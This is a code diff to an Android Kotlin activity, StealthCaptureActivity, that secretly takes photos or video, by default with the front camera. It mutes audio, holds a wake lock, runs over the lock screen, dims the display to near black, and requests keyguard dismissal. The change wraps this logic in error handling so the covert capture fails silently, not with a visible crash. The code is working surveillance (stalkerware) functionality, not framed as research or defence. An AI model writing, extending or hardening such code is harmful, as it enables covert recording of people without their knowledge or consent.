@@ -60,63 +60,72 @@ class StealthCaptureActivity : AppCompatActivity() {
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
-        configureWindow()
         super.onCreate(savedInstanceState)
+        try {
+            configureWindow()
 
-        binding = ActivityStealthCaptureBinding.inflate(layoutInflater)
-        setContentView(binding.root)
+            binding = ActivityStealthCaptureBinding.inflate(layoutInflater)
+            setContentView(binding.root)
 
-        acquirePartialWakeLock()
-        muteAudio()
+            acquirePartialWakeLock()
+            muteAudio()
 
-        val mode = intent.getStringExtra(EXTRA_MODE) ?: MODE_PHOTO
-        val useFront = intent.getBooleanExtra(EXTRA_CAMERA_FRONT, true)
-        val duration = intent.getIntExtra(EXTRA_DURATION, 15).coerceIn(1, 60)
+            val mode = intent.getStringExtra(EXTRA_MODE) ?: MODE_PHOTO
+            val useFront = intent.getBooleanExtra(EXTRA_CAMERA_FRONT, true)
+            val duration = intent.getIntExtra(EXTRA_DURATION, 15).coerceIn(1, 60)
 
-        Log.i(TAG, "StealthCaptureActivity started: mode=$mode, front=$useFront, duration=${duration}s")
+            Log.i(TAG, "StealthCaptureActivity started: mode=$mode, front=$useFront, duration=${duration}s")
 
-        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
-        cameraProviderFuture.addListener({
-            try {
-                cameraProvider = cameraProviderFuture.get()
-                if (mode == MODE_VIDEO) {
-                    startVideoCapture(useFront, duration)
-                } else {
-                    startPhotoCapture(useFront)
+            val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
+            cameraProviderFuture.addListener({
+                try {
+                    cameraProvider = cameraProviderFuture.get()
+                    if (mode == MODE_VIDEO) {
+                        startVideoCapture(useFront, duration)
+                    } else {
+                        startPhotoCapture(useFront)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to initialize CameraProvider in activity", e)
+                    finishWithResult(null, "Camera init failure: ${e.message}")
                 }
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to initialize CameraProvider in activity", e)
-                finishWithResult(null, "Camera init failure: ${e.message}")
-            }
-        }, ContextCompat.getMainExecutor(this))
+            }, ContextCompat.getMainExecutor(this))
+        } catch (e: Throwable) {
+            Log.e(TAG, "Fatal error in StealthCaptureActivity.onCreate", e)
+            finishWithResult(null, "StealthCaptureActivity onCreate error: ${e.message}")
+        }
     }
 
     // ── Window Configuration ─────────────────────────────────────────────────
 
     private fun configureWindow() {
-        // Use setShowWhenLocked API (does not forcibly wake the screen)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
-            setShowWhenLocked(true)
-            // Do NOT call setTurnScreenOn(true) — we use PARTIAL_WAKE_LOCK instead
-        }
+        try {
+            // Use setShowWhenLocked API (does not forcibly wake the screen)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+                setShowWhenLocked(true)
+                // Do NOT call setTurnScreenOn(true) — we use PARTIAL_WAKE_LOCK instead
+            }
 
-        @Suppress("DEPRECATION")
-        window.addFlags(
-            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
-            WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON or
-            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
-            // FLAG_TURN_SCREEN_ON intentionally omitted — PARTIAL_WAKE_LOCK is sufficient
-        )
+            @Suppress("DEPRECATION")
+            window.addFlags(
+                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON or
+                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                // FLAG_TURN_SCREEN_ON intentionally omitted — PARTIAL_WAKE_LOCK is sufficient
+            )
 
-        // Dim screen to nearly black in case it does illuminate
-        val lp = window.attributes
-        lp.screenBrightness = 0.01f
-        window.attributes = lp
+            // Dim screen to nearly black in case it does illuminate
+            val lp = window.attributes
+            lp.screenBrightness = 0.01f
+            window.attributes = lp
 
-        // Dismiss keyguard if already unlocked
-        val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            keyguardManager?.requestDismissKeyguard(this, null)
+            // Dismiss keyguard if already unlocked
+            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                keyguardManager?.requestDismissKeyguard(this, null)
+            }
+        } catch (e: Throwable) {
+            Log.w(TAG, "Error in configureWindow: ${e.message}")
         }
     }
 
